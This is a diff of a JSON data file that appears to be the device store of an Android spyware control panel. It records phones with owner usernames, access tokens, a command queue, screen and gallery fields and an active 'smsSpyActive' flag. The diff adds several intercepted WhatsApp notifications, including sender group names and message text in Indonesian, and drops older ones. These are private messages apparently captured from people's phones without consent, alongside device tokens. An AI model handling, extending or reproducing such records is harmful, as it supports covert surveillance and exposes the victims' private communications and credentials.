@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776779985257,
+    "lastSeen": 1776779991001,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3574 pesan dari 21 chat",
+        "time": "21/04 20:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779991522
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎7Sex Message (240 pesan): ~ N9THCRAL",
+        "content": "Gw juga tau kli😭😭",
+        "time": "21/04 20:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779991433
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3573 pesan dari 21 chat",
+        "time": "21/04 20:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779987499
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "GB byone/mabar ff 8a: dika",
+        "content": "egiluy",
+        "time": "21/04 20:59",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776779987487
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10296,38 +10328,6 @@
         "time": "21/04 20:25",
         "pkg": "com.whatsapp",
         "receivedAt": 1776777934478
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ZUNZ PEKALONGAN (964 pesan): ~ zunz",
-        "content": "jngn di beli",
-        "time": "21/04 20:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777934455
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3559 pesan dari 22 chat",
-        "time": "21/04 20:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777933936
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ZUNZ PEKALONGAN (964 pesan): ~ zunz",
-        "content": "dia pwrnah ngerip",
-        "time": "21/04 20:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777933882
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3559 pesan dari 22 chat",
-        "time": "21/04 20:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777933161
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776779983932,
+    "lastSeen": 1776779989930,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776779983860,
+    "lastSeen": 1776779990017,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
